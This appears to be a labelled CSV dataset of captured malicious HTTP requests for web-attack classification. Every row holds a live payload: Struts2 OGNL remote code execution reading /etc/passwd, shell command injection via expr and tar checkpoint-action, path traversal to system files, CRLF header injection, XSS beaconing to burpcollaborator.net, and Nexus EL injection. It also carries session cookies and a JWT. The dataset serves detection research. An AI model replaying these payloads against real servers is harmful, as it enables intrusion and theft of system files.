id,method,user_agent,url,refer,body,lable
932,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~404~appoint~auth~detail~%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs~main~print~sign~signature~template.1e25895209c51ce48c4e.js,http://124.70.151.147:9180/,"GET /assets/js/default~404~appoint~auth~detail~%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
1062,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/js/vendors~main~print.fcabf04fff1c7ea5c318.js,http://124.70.151.147:9180/,"GET /%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/js/vendors~main~print.fcabf04fff1c7ea5c318.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
1236,GET,python-requests/2.27.1,/doUpload.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D,,,4
579,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",/docs/config//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd,,"GET /docs/config//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1 Cookie: JSESSIONID=D9F9868E2707115B890F8DE2C36EB2E6 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.47 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",4
646,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/qyswebapp/%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/js/main.899d901d1938944eee24.js,http://124.70.151.147:9180/,"GET /qyswebapp/%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/js/main.899d901d1938944eee24.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
127,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/bgczStatusAction.do?_=1654510058664&auditApplyDateBegin=&auditApplyDateEnd=&commitiResult=&csrcCode=&currStatus=&isPagination=true&jsonCallBack=jsonpCallback53738&keyword=&offerType=&order=updateDate%7Cdesc&pageHelp.beginPage=1&pageHelp.endPage=1&pageHelp.pageNo=1%250d%250aCRLF-Header%3ACRLF-Value&pageHelp.pageSize=5&registeResult=&sqlId=GP_BGCZ_XMLB,http://star.sse.com.cn/,"GET /bgczStatusAction.do?_=1654510058664&auditApplyDateBegin=&auditApplyDateEnd=&commitiResult=&csrcCode=&currStatus=&isPagination=true&jsonCallBack=jsonpCallback53738&keyword=&offerType=&order=updateDate%7Cdesc&pageHelp.beginPage=1&pageHelp.endPage=1&pageHelp.pageNo=1%250d%250aCRLF-Header%3ACRLF-Value&pageHelp.pageSize=5&registeResult=&sqlId=GP_BGCZ_XMLB HTTP/1.1 Host: query.sse.com.cn User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: zh-CN,zh;q=0.9 Cookie: yfx_c_g_u_id_10000042=_ck22060618074012331734318810553; yfx_f_l_v_t_10000042=f_t_1654510060234__r_t_1654510060234__v_t_1654510060234__r_c_0 Referer: http://star.sse.com.cn/ Accept-Encoding: gzip  ",4
1075,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~400~appoint~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~detail~identify~main~print~sign~signature~template.8cd81fe93872e5162f62.js,http://124.70.151.147:9180/,"GET /assets/js/default~404~appoint~auth~detail~identify~main~print~sign~signature~%c4%8aSomeCustomInjectedHeader:%20injected_by_wvs.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~400~appoint~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~detail~identify~main~print~sign~signature~template.8cd81fe93872e5162f62.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
311,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/1fhrqqk8b4p9bwh385dv5cz0drjo7hv9mxdp0fo4X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/1fhrqqk8b4p9bwh385dv5cz0drjo7hv9mxdp0fo4X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/  ",4
995,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A%2Fetc%2Fsudo%20tar%20-cf%20%2Fdev%2Fnull%20%2Fdev%2Fnull%20--checkpoint%3d1%20--checkpoint-action%3dexec%3d%22expr%20834372384%20%2b%20900385106%22%0A%27,,,4
1050,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/css/%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs~appoint~main.0b21164434930c9be4a3.css,http://124.70.151.147:9180/,"GET /assets/css/default~detail~sign.142d5496606d0a3a6ec8&n909239=v972349.css HTTP/1.1 Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/css/%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs~appoint~main.0b21164434930c9be4a3.css HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/vendors~%0d%0a%20SomeCustomInjectedHeader:%20injected_by_wvs~print.fcabf04fff1c7ea5c318.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
378,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/assets/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/kbz3pbjcm67czhbeu8oc3ryqphvaj1ap2gqdd41tX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/images/products/lemon_juice.jpg,http://121.4.111.58:3000/,"GET /assets/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/kbz3pbjcm67czhbeu8oc3ryqphvaj1ap2gqdd41tX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/images/products/lemon_juice.jpg HTTP/1.1 Host: 121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5k",4
1111,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/js/default~500~appoint~auth~detail~identify~main~print~sign~signature~template.967292fd97008e6eb1ac.js,http://124.70.151.147:9180/,"GET /login/name?_=bxss.me HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /login/pin?_=%5E(%23%24!%40%23%24)(()))******&encrypt=false&needCaptcha=false HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/js/default~500~appoint~auth~detail~identify~main~print~sign~signature~template.967292fd97008e6eb1ac.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
39,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/s/opentsdb_header.jpg/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3Bexpr%20895585975%20%2B%20907926712%20%20%23,,,4
17,GET,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action,,"GET /%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action HTTP/1.1 Host: 198.11.172.250 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip  ",4
804,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~sign.d543861d90eeafa382fa.js,http://124.70.151.147:9180/,"GET /assets/js/default~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~sign.d543861d90eeafa382fa.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
71,GET,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",/agweb/index.html/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23,,"GET /agweb/index.html/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23 HTTP/1.1 Host: 223.80.98.219:20000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip  ",4
306,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/w74milc33zh43r9y005qx7rv5mbjzen6eubh15qX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/incident-support.kdbx,http://121.4.111.58:3000/ftp,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/w74milc33zh43r9y005qx7rv5mbjzen6eubh15qX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/incident-support.kdbx HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",4
755,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/vendors~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~chunk-contract-sign~sign.08d30d70ed6728011036.js,http://124.70.151.147:9180/,"GET /assets/js/vendors~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~chunk-contract-sign~sign.08d30d70ed6728011036.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
817,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~404~%3f%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js,http://124.70.151.147:9180/,"GET /assets/js/default~404~%3f%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs~auth~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
424,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/static/css//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,,"GET /static/css//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 114.113.233.161:9001 Connection: Keep-alive  ",4
1378,POST,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/%20dot%20/extdirect,,"{""action"":""coreui_User"",""method"":""update"",""data"":[{""userId"":""anonymous"",""version"":""1"",""firstName"":""Anonymous"",""lastName"":""User2"",""email"":""anonymous@example.org"",""status"":""active"",""roles"":[""$\\c{43622*43224}""]}],""type"":""rpc"",""tid"":28} ",4
761,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/?redirect:$%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p77496e746f7a3574396d%2010.16.44.23%27%29.getInputStream%28%29%29%7d,,,4
989,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3Bexpr%20909867168%20%2B%20919761694%20%20%23,,,4
586,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/qyswebapp/assets/fonts//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows/win.ini,,"GET /qyswebapp/assets/fonts/ HTTP/1.1 User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4201.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br Host: 124.70.151.147:9180 Connection: Keep-alive  GET /qyswebapp/assets/fonts//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows/win.ini HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
773,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/vendors~main~print.fcabf04fff1c7ea5c318.js,http://124.70.151.147:9180/,"GET /assets/%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs/vendors~main~print.fcabf04fff1c7ea5c318.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
